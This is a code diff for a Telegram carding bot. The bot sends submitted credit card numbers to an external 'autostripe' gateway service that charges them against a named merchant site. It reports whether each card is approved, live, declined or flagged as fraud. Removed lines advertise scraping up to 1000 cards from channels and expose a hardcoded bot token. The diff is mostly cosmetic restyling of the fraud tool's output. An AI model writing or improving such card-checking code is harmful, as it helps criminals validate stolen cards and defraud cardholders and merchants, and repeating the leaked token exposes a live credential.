@@ -402,7 +402,6 @@ def get_main_keyboard() -> InlineKeyboardMarkup:
             InlineKeyboardButton("⌨️ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬", callback_data="tools_menu")
         ],
         [
-            InlineKeyboardButton("⚡ 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫", callback_data="scrapper_menu"),
             InlineKeyboardButton("💎 Owner", url=DEV_LINK)
         ],
         [InlineKeyboardButton("👥 Official Group", url=OFFICIAL_GROUP_LINK)],
@@ -699,31 +698,6 @@ async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT
         reply_markup=InlineKeyboardMarkup(keyboard),
     )
 
-async def scrapper_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Callback handler for the 'Scrapper' button."""
-    q = update.callback_query
-    await q.answer()
-    text = (
-        "✦━━━━━━━━━━━━━━✦\n"
-        "    ⚡ 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫\n"
-        "✦━━━━━━━━━━━━━━✦\n\n"
-        "• `/scr` `<channel_username>` `<amount>`\n"
-        "  Example:\n"
-        "  `/scr @examplechannel 50`\n\n"
-        "👉 Scrapes cards from the given channel\\.\n"
-        "⚠️ Maximum amount allowed: *1000 cards*\\.\n\n"
-        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
-    )
-    keyboard = [
-        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
-    ]
-    await q.edit_message_caption(
-        text,
-        parse_mode=ParseMode.MARKDOWN_V2,
-        reply_markup=InlineKeyboardMarkup(keyboard),
-    )
-
-
 
 async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Callback handler for the '3DS Lookup' button."""
@@ -776,127 +750,12 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await stripe_examples_handler(update, context)
     elif data == "braintree_examples":
         await braintree_examples_handler(update, context)
-    elif data == "scrapper_menu":
-        await scrapper_menu_handler(update, context)
     elif data == "ds_lookup":
         await ds_lookup_menu_handler(update, context)
     elif data == "back_to_start":
         await back_to_start_handler(update, context)
     else:
         await q.answer("⚠️ Unknown option selected.", show_alert=True)
-
-
-
-import os
-import logging
-from functools import wraps
-from telegram import Update, ChatMember, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    MessageHandler,
-    filters,
-)
-from db import init_db
-
-# --- Bot & Security Config ---
-BOT_TOKEN = "8058780098:AAERQ25xuPfJ74mFrCLi3kOpwYlTrpeitcg"
-OWNER_ID = 8493360284
-GROUP_ID = "@bosssdkkk"
-CHANNEL_ID = "@abtkalinux"
-FORCE_JOIN_IMAGE = "https://i.postimg.cc/hjNQNyP1/1ea64ac8-ad6a-42f2-89b1-3de4a0d8e447.png"
-
-# --- Logging ---
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-# --- Helper: Check if user joined ---
-async def is_user_joined(bot, user_id: int) -> bool:
-    try:
-        group_status = await bot.get_chat_member(GROUP_ID, user_id)
-        channel_status = await bot.get_chat_member(CHANNEL_ID, user_id)
-
-        if group_status.status in [ChatMember.LEFT, ChatMember.KICKED]:
-            return False
-        if channel_status.status in [ChatMember.LEFT, ChatMember.KICKED]:
-            return False
-        return True
-    except Exception:
-        return False
-
-# --- Force Join Decorator ---
-def force_join(func):
-    @wraps(func)
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-        user_id = update.effective_user.id
-
-        # Always allow /start
-        if update.message and update.message.text.startswith("/start"):
-            return await func(update, context, *args, **kwargs)
-
-        joined = await is_user_joined(context.bot, user_id)
-        if not joined:
-            keyboard = [
-                [InlineKeyboardButton("📢 Join Group", url=f"https://t.me/{GROUP_ID.lstrip('@')}")],
-                [InlineKeyboardButton("📡 Join Channel", url=f"https://t.me/{CHANNEL_ID.lstrip('@')}")],
-                [InlineKeyboardButton("✅ I have joined", callback_data="check_joined")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-
-            if update.message:
-                await update.message.reply_photo(
-                    photo=FORCE_JOIN_IMAGE,
-                    caption=(
-                        "❌ You must join our group and channel to use this bot.\n\n"
-                        f"👉 Group: {GROUP_ID}\n"
-                        f"👉 Channel: {CHANNEL_ID}\n\n"
-                        "➡️ After joining, press ✅ I have joined."
-                    ),
-                    reply_markup=reply_markup
-                )
-            elif update.callback_query:
-                await update.callback_query.message.reply_photo(
-                    photo=FORCE_JOIN_IMAGE,
-                    caption=(
-                        "❌ You must join our group and channel to use this bot.\n\n"
-                        f"👉 Group: {GROUP_ID}\n"
-                        f"👉 Channel: {CHANNEL_ID}\n\n"
-                        "➡️ After joining, press ✅ I have joined."
-                    ),
-                    reply_markup=reply_markup
-                )
-            return
-
-        return await func(update, context, *args, **kwargs)
-    return wrapper
-
-# --- Callback for "I have joined" button ---
-async def check_joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    user_id = query.from_user.id
-
-    joined = await is_user_joined(context.bot, user_id)
-
-    if joined:
-        await query.answer("✅ You have joined, now you can use the bot!", show_alert=True)
-        await query.edit_message_caption("🎉 Welcome! You can now use the bot commands.")
-    else:
-        await query.answer("❌ You still need to join both group and channel.", show_alert=True)
-
-
-# --- Database init ---
-async def post_init(application):
-    await init_db()
-    logger.info("✅ Database initialized")
-
-
-
-
-
-
-
 
 
 
@@ -1591,10 +1450,6 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         country_flag = bin_details.get("country_emoji", "")
         card_type = bin_details.get("type", "N/A")
         card_level = bin_details.get("brand", "N/A")
-        card_length = bin_details.get("length", "N/A")
-        luhn_check = bin_details.get("luhn", "N/A")
-        bank_phone = bin_details.get("bank_phone", "N/A")
-        bank_url = bin_details.get("bank_url", "N/A")
 
         # Call main API
         api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
@@ -1604,18 +1459,20 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
 
+        # Extract status + response from API
         api_status = (data.get("status") or "Unknown").strip()
+        api_response = (data.get("response") or "No response").strip()
 
-        # Status formatting
+        # Status formatting (with icons + bold style)
         lower_status = api_status.lower()
         if "approved" in lower_status:
-            status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
+            status_text = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
         elif "declined" in lower_status:
-            status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+            status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
         elif "ccn live" in lower_status:
-            status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
+            status_text = "❎ 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
         elif "incorrect" in lower_status or "your number" in lower_status:
-            status_text = "❌ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ❌"
+            status_text = "⚠️ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ⚠️"
         elif "3ds" in lower_status or "auth required" in lower_status:
             status_text = "🔒 3𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔒"
         elif "insufficient funds" in lower_status:
@@ -1628,14 +1485,14 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
         elif "fraudulent" in lower_status:
             status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
-        elif "generic decline" in lower_status:
-            status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
         else:
-            status_text = api_status.upper()
+            status_text = f"ℹ️ {api_status.upper()}"
 
-        # Header + response
-        header = f"═══ [ *{escape_md(status_text)}* ] ═══"
-        formatted_response = f"_{escape_md(api_status)}_"
+        # Stylish box for status
+        header = f"◇━━〔 {escape_md(status_text)} 〕━━◇"
+
+        # API response italic
+        formatted_response = f"_{escape_md(api_response)}_"
 
         # Build final message with [⌇] bullets
         final_text = (
@@ -1667,6 +1524,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             parse_mode=ParseMode.MARKDOWN_V2,
             disable_web_page_preview=True
         )
+
 
 
 
@@ -1740,13 +1598,14 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
 
     # Processing message
+    # Processing message
     processing_text = (
-        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-        f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+        "```Processing```\n"
+        f"`{escape_markdown_v2(cc_normalized)}`\n\n"
         f"{bullet_link} Gateway ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
-        f"{bullet_link} Status ➜ Checking🔎\\.\\.\\.\n"
-        "════════════════════"
+        f"{bullet_link} Status ➜ Checking 🔎...\n"
     )
+
 
     status_msg = await update.effective_message.reply_text(
         processing_text,
